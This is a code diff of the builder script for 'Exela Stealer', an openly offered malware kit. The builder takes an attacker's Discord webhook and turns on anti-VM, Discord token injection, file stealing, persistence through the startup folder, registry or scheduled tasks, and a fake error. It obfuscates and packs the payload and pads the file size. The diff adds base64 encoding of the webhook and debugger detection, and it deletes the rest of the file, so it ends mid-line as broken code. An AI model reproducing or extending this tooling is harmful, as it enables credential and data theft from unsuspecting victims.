@@ -1,19 +1,50 @@
-# https://t.me/ExelaStealer ( offical telegram channel of the exela )
-# Coded by quicaxd
-# Builder of Exela Stealer
-# Thank you for choosing us, Good usages
-
 import os
 import ctypes
 import shutil
 import sys
 import re
+import logging
+import psutil
+import json
+import base64
+from functools import wraps
+import tkinter as tk
+from tkinter import filedialog
 
-try:
-    # Set's the console title
-    ctypes.windll.kernel32.SetConsoleTitleW(f"Exela Stealer | Builder | {os.getenv('computername')}")
-except:
-    pass
+# Configure logging
+logging.basicConfig(filename='build_log.log', level=logging.INFO)
+
+# Function to log errors
+def log_error(message):
+    logging.error(message)
+    ctypes.windll.user32.MessageBoxW(0, message, "Error", 0x10)
+
+# Function to encrypt webhook URL
+def encrypt_webhook(webhook):
+    encoded_webhook = base64.b64encode(webhook.encode('utf-8')).decode('utf-8')
+    return encoded_webhook
+
+# Function to decrypt webhook URL
+def decrypt_webhook(encoded_webhook):
+    return base64.b64decode(encoded_webhook.encode('utf-8')).decode('utf-8')
+
+# Check if debugger is running
+def is_debugger_present():
+    debuggers = ["ollydbg", "x64dbg", "windbg"]
+    for process in psutil.process_iter():
+        if any(debugger in process.name().lower() for debugger in debuggers):
+            return True
+    return False
+
+# Function decorator for error handling
+def handle_errors(func):
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            log_error(f"Error in {func.__name__}: {e}")
+    return wrapper
 
 # Class for building the Exela
 class Build:
@@ -31,48 +62,41 @@ class Build:
         self.pumSize = int()  # mb
         self.PyInstallerCommand = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt"
 
+    @handle_errors
     def CallFuncions(self) -> None:
+        # Call various functions to gather user input and perform build steps
+        self.GetWebhook()
+        self.GetAntiVm()
+        self.GetDiscordInjection()
+        self.GetStealFiles()
+        self.GetStartupMethod()
+        self.GetFakeError()
+        self.GetIcon()
+        self.PumpFile()
+        self.WriteSettings()
+        os.system("cls")
+        self.ObfuscateFile("Stub.py")
+        self.build_file()
+        shutil.copy("dist\\stub.exe", "stub.exe")
+        if self.pump == True:
+            self.expand_file("stub.exe", self.pumSize)
         try:
-            # Call's various functions to gather user input and perform build steps
-            self.GetWebhook()
-            self.GetAntiVm()
-            self.GetDiscordInjection()
-            self.GetStealFiles()
-            self.GetStartupMethod()
-            self.GetFakeError()
-            self.GetIcon()
-            self.PumpFile()
-            self.WriteSettings()
-            os.system("cls")
-            self.ObfuscateFile("Stub.py")
-            self.build_file()
-            shutil.copy("dist\\stub.exe", "stub.exe")
-            if self.pump == True:
-                self.expand_file("stub.exe", self.pumSize)
-            try:
-                # Delete Junk Files & Directories
-                shutil.rmtree("dist")
-                shutil.rmtree("build")
-                os.remove("stub.py")
-                os.remove("stub.spec")
-            except:
-                pass
-            if os.path.exists("stub.exe"):
-                os.rename("stub.exe", "Exela.exe")
-            print("\nfile compiled, close the window")
-        except Exception as e:
-            # Displays an error message if an exception occurs
-            ctypes.windll.user32.MessageBoxW(0, f"An error occurred while building your file. error code\n\n{str(e)}", "Error", 0x10)
-        else:
-            # Displays success message and open the file location
-            os.system("start .")
-            ctypes.windll.user32.MessageBoxW(0, "Your file compiled successfully, now you can close the window.", "Information", 0x40)
-            while True:
-                continue
+            shutil.rmtree("dist")
+            shutil.rmtree("build")
+            os.remove("stub.py")
+            os.remove("stub.spec")
+        except:
+            pass
+        if os.path.exists("stub.exe"):
+            os.rename("stub.exe", "Exela.exe")
+        print("\nfile compiled, close the window")
+        os.system("start .")
+        ctypes.windll.user32.MessageBoxW(0, "Your file compiled successfully, now you can close the window.", "Information", 0x40)
+        while True:
+            continue
 
-    # Function to prompt user for file pumping option
     def PumpFile(self) -> None:
-        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo you want to pump the file : "))
+        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo you want to pump the file: "))
         if pump_q.lower() == "y" or pump_q.lower() == "yes":
             pump_size = int(input("How much mb size do you want to pump: "))
             self.pump = True
@@ -80,27 +104,25 @@ class Build:
         else:
             self.pump = False
 
-    # Function to expand the size of a file
+    @handle_errors
     def expand_file(self, file_name, additional_size_mb) -> None:
         if os.path.exists(file_name):
             additional_size_bytes = additional_size_mb * 1024 * 1024
-
             with open(file_name, "ab") as file:
                 empty_bytes = bytearray([0x00] * additional_size_bytes)
                 file.write(empty_bytes)
-
                 print(f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"')
 
-    # Function to build the file using PyInstaller
+    @handle_errors
     def build_file(self) -> None:
         os.system(self.PyInstallerCommand)
 
-    # Function to write settings to the Stub.py file
+    @handle_errors
     def WriteSettings(self) -> None:
         with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
             data = file.read()
         replaced_data = (
-            data.replace("%WEBHOOK%", str(self.webhook))
+            data.replace("%WEBHOOK%", encrypt_webhook(self.webhook))
             .replace('"%Anti_VM%"', str(self.Anti_VM))
             .replace('"%injection%"', str(self.injection))
             .replace("%startup_method%", str(self.StartupMethod))
@@ -110,16 +132,16 @@ class Build:
         with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
             laquica.write(replaced_data)
 
-    # Function to obfuscate the Stub.py file
+    @handle_errors
     def ObfuscateFile(self, input_file) -> None:
         obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
         os.system(f'python "{obf_file}" "{input_file}" stub.py')
 
-    # Function to prompt user for changing the file icon
+    @handle_errors
     def GetIcon(self) -> None:
-        get_icon = str(input("Yes/No\nDo you want to change the icon of the file : "))
+        get_icon = str(input("Yes/No\nDo you want to change the icon of the file: "))
         if get_icon.lower() == "yes" or get_icon.lower() == "y":
-            get_icon_path = str(input("The icon file must be .ico, otherwise the icon will not change.\nEnter the path of the icon file : "))
+            get_icon_path = self.select_icon()
             if not get_icon_path.endswith(".ico"):
                 print("Please use .ico file, now icon change has been disabled")
                 self.PyInstallerCommand += " --icon=NONE stub.py"
@@ -136,95 +158,24 @@ class Build:
         else:
             self.PyInstallerCommand += " --icon=NONE stub.py"
 
-    # Function to check if a file is a valid .ico file
+    @handle_errors
     def CheckIcoFile(self, file_path: str) -> bool:
         try:
             ico_header = b"\x00\x00\x01\x00"  # ico header
-
             with open(file_path, "rb") as file:
                 header_data = file.read(4)
-
             return header_data == ico_header
         except:
             return False
 
-    # Function to prompt user for using fake error
+    def select_icon(self) -> str:
+        root = tk.Tk()
+        root.withdraw()
+        icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
+        return icon_path
+
+    @handle_errors
     def GetFakeError(self) -> None:
         try:
-            er = str(input("Yes/No\nDo you want to use fake Error : "))
-            if er.lower() == "yes" or er.lower() == "y":
-                self.fakeError = True
-            else:
-                self.fakeError = False
-        except:
-            pass
-
-    # Function to prompt user for webhook URL
-    def GetWebhook(self) -> None:
-        user_webhook = str(input("Enter your webhook URL : "))
-        if user_webhook.startswith("https://") and "discord" in user_webhook:
-            self.webhook = user_webhook
-        else:
-            print("PLS Enter an correct webhook url, close this window and re-start the builder.")
-            while True:
-                continue
-            
-    # Function to prompt user for enabling file stealing
-    def GetStealFiles(self) -> None:
-        getFilesReq = str(input("Yes/No\nDo you want to enable File Stealer: "))
-        if getFilesReq.lower() == "y" or getFilesReq.lower() == "yes":
-            self.StealFiles = True
-        else:
-            self.StealFiles = False
-
-    # Function to prompt user for enabling Anti-VM
-    def GetAntiVm(self) -> None:
-        getAntiVmReq = str(input("Yes/No\nDo you want to enable Anti-VM : "))
-        if getAntiVmReq.lower() == "y" or getAntiVmReq.lower() == "yes":
-            self.Anti_VM = True
-        else:
-            self.Anti_VM = False
-
-    # Function to prompt user for startup method
-    def GetStartupMethod(self) -> None:
-        getStartupReq = str(input("Yes/no\nDo you want to use Startup : "))
-        if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
-            self.startup = True
-            print("--------------------------------------------\n1-)Folder Startup (This method uses Windows startup folder for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n")
-            getStartupMethod = input("1/2/3/4\nEnter your selection: ")
-            if getStartupMethod == "1":
-                self.StartupMethod = "folder"
-            elif getStartupMethod == "2":
-                self.StartupMethod = "regedit"
-            elif getStartupMethod == "3":
-                self.StartupMethod = "schtasks"
-            elif getStartupMethod == "4":
-                self.StartupMethod == "no-startup"
-            else:
-                print("Unknown Startup method, startup has been disabled.")
-                self.startup = False
-                self.StartupMethod = "no-startup"
-        else:
-            self.startup = False
-            self.StartupMethod == "no-startup"
-
-    # Function to prompt user for enabling Discord injection
-    def GetDiscordInjection(self) -> None:
-        inj = str(input("Yes/No\nDo you want to enable Discord injection : "))
-        if inj.lower() == "y" or inj.lower() == "yes":
-            self.injection == True
-        else:
-            self.injection = False
-
-# Entryp point of the program
-if __name__ == "__main__":
-    if os.name == "nt":
-        if (sys.version_info.major == 3 and sys.version_info.minor >= 10 and sys.version_info.minor < 12):
-            # Create an instance of Build class and call the main building function
-            Build().CallFuncions()
-        else:
-            # Displays an error message if Python version is not supported
-            message = "Your Python version is unsupported by Exela. Please use Python 3.10.0 or 3.11.0"
-            ctypes.windll.user32.MessageBoxW(None, ctypes.c_wchar_p(message), "Error", 0x10)
-    else:
-        print("Only Windows operating systems are supported!")
+            er = str(input("Yes/No\nDo you want to use fake Error: "))
+            if er.lower() == "yes" or er.lower() == "y
